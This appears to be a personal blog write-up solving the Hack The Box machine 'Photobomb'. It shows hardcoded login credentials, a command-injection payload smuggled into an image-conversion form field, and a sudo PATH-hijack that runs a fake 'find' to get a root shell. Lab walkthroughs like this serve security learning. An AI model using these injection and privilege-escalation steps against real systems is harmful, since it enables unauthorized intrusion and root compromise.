---
title: Photobomb [HTB]
published: true
---

# Introduction
Photobomb is a straightforward Hackthebox machine (Easy difficulty). It does not have a lot of steps and I don't think I learned a lot from this box. Although it was a good way to get into security again. Since I had a little break from it. College got in the way and I got a Quarter-life crisis. Let's get into it then!

# Initial enumeration
Nmap wasn't that useful for this box. It just displayed SSH and HTTP services, as usual. So I will not post the outputs here.

After setting photobomb.htb in /etc/hosts, we use gobuster to find interesting directories. But since it wasn't useful, I won't post it here either.

# Getting User.txt

Visiting the website we can see a link, and by clicking it, it asks for creds, which we don't have. When we check the sources of the page, there's a JavaScript file that looks for a cookie using regex. If there's a match you're logged in to the site using the username: pH0t0 and the password: b0Mb!

Cool, now we can select and download pictures, there's a POST form. Using burpsuite let's see the request and response. The POST request looks like this:

```
POST /printer HTTP/1.1
Host: photobomb.htb
Content-Length: 78
Cache-Control: max-age=0
Upgrade-Insecure-Requests: 1
Origin: http://photobomb.htb
Content-Type: application/x-www-form-urlencoded
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/106.0.5249.62 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Referer: http://photobomb.htb/printer
Accept-Encoding: gzip, deflate
Accept-Language: en-GB,en-US;q=0.9,en;q=0.8
Connection: close

photo=voicu-apostol-MWER49YaD-M-unsplash.jpg&filetype=jpg&dimensions=3000x2000

```

The following parameters are present: photo, filetype, and dimensions. There might be a conversion taking place on the backend. Which might mean that we can cause some RCE. Let's use parameter tampering with pings to check if there's a delay in response.

```
photo=voicu-apostol-MWER49YaD-M-unsplash.jpg&filetype=jpg;ping%20-c%203&dimensions=3000x2000
```

Yup, there's a delay, RCE is possible in the filetype parameter!
Now just find a python shell online, use URL encoding to encode it, and paste it in the filetype parameter. DON'T FORGET TO WRITE "jpg;" IN THE PARAMETER!

Pop a shell and get user.txt!

# Getting root
Now we have a shell, so let's try to find something useful to get root. I always start by checking what sudo -l returns.

```
$ sudo -l
Matching Defaults entries for wizard on photobomb:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User wizard may run the following commands on photobomb:
    (root) SETENV: NOPASSWD: /opt/cleanup.sh
```

/opt/cleanup.sh looks like a very interesting script. Let's check it out!

```
$ cat /opt/cleanup.sh
#!/bin/bash
. /opt/.bashrc
cd /home/wizard/photobomb

# clean up log files
if [ -s log/photobomb.log ] && ! [ -L log/photobomb.log ]
then
  /bin/cat log/photobomb.log > log/photobomb.log.old
  /usr/bin/truncate -s0 log/photobomb.log
fi

# protect the priceless originals
find source_images -type f -name '*.jpg' -exec chown root:root {} \;
```

So basically this script cleans up log files from the web app. I'll be honest, the solution didn't come clear to me. However, it worked and it was very simple and easy to understand, basically, we will "replace" the find command and use it as a way to pop a privileged shell. So let's do it!

```
$ cd /tmp
$ touch find
$ echo "/bin/bash -p" > find
$ chmod +x find
$ sudo PATH=/tmp:$PATH /opt/cleanup.sh
id
uid=0(root) gid=0(root) groups=0(root)
```

# Conclusion
Overall, this machine was very straightforward. It was a very easy machine, without many steps. Getting user was extremely easy for me. However, Root required a little research and creativity! 5/10 box!
